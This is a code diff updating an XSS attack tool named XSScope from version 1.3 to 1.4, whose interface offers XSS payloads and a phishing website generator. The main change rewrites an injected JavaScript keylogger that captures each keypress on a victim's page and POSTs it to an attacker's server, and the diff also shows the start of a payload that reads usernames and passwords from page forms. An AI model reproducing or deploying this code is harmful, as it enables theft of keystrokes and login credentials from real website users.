@@ -138,12 +138,19 @@ http://canyouseeme.org
         root1.update_idletasks()
 
         html_file = []
-        keylogger_code = """document.onkeypress = function KeyLogger(inp){
-  key_pressed = String.fromCharCode(inp.which);
-  new Image().src = http://""" + tcp_server + """/retriever.php?xsscope="+key_pressed;
+        keylogger_code = '''document.onkeypress = function(evt) {
+	evt = evt || window.event
+	key = String.fromCharCode(evt.charCode)
+	if (key) {
+	   var http = new XMLHttpRequest();
+	   var param = encodeURI(key)
+	   http.open("POST", "http://''' + tcp_server + '''/retriever.php?xsscope="+param, true);
+	   http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	   http.send("xsscope="+param);
+	}
 }
 
-"""
+'''
 
         xhr_harverster_code = '''username = document.forms[0].elements[0].value;
 password = document.forms[0].elements[1].value;
@@ -499,7 +506,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.3 - All XSS Payloads")
+    root3.title("XSScope v.1.4 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -695,7 +702,7 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.1.3 - Phishing Website Generator")
+    root4.title("XSScope v.1.4 - Phishing Website Generator")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
@@ -705,7 +712,7 @@ def phishing_website():
 
     def show_payloads_html():
         root3_html = tk.Toplevel()
-        root3_html.title("XSScope v.1.3 - All XSS Payloads for generated HTML code")
+        root3_html.title("XSScope v.1.4 - All XSS Payloads for generated HTML code")
         root3_html.geometry('750x580')
         # root3_html.iconbitmap('x_logo_VYw_icon.ico')
         root3_html.resizable(0, 0)
@@ -1120,11 +1127,10 @@ def phishing_website():
 def main():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.3")
+    root.title("XSScope v.1.4")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
-    current_version = 1.3
     #end of the gui propertie
     #print the welcoming message in the terminal/cmd
 
